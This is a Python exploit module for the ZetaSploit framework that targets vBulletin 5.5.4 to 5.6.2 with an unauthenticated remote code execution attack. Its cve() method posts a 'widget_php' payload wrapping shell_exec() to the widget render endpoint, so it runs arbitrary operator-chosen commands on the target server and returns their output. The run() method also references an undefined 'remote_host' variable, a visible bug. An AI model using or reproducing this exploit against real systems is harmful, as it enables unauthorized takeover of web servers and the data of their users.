#!/usr/bin/env python3

#
# MIT License
#
# Copyright (c) 2020-2021 EntySec
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
#

import requests

from core.parser import parser
from core.badges import badges
from core.helper import helper

class ZetaSploitModule:
    def __init__(self):
        self.parser = parser()
        self.badges = badges()
        self.helper = helper()
        
        self.details = {
            'Name': "exploit/multi/vbulletin_widget_php/cve_2020_7373",
            'Authors': [
                'enty8080'
            ],
            'Description': "vBulletin 5.5.4 till 5.6.2 widget_php Unauthenticated Remote Code Execution.",
            'Comments': [
                ''
            ]
        }
        
        self.options = {
            'URL': {
                'Description': "Target URL address.",
                'Value': None,
                'Required': True
            },
            'COMMAND': {
                'Description': "Command to execute.",
                'Value': "uname -a",
                'Required': True
            }
        }
        
    def cve(self, vb_loc, shell_cmd):
        post_data = {'subWidgets[0][template]' : 'widget_php', 'subWidgets[0][config][code]' : "echo shell_exec('%s'); exit;" % shell_cmd}
        request = requests.post('%s/ajax/render/widget_tabbedcontainer_tab_panel' % vb_loc, post_data)
        return (request.status_code, request.text)
        
    def run(self):
        target_url, command = self.parser.parse_options(self.options)
        target_url = self.helper.normalize_url(target_url)
        
        self.badges.output_process("Exploiting " + remote_host + "...")
        self.badges.output_process("Attempting to execute command...")
        try:
            status, command_output = self.cve(target_url, command)
            if status != 200:
                self.badges.output_error("Failed to execute command!")
                return
            self.badges.output_information("Command output:")
            self.badges.output_empty(command_output)
        except (EOFError, KeyboardInterrupt):
            pass
        except Exception:
            self.badges.output_error("Failed to exploit!")
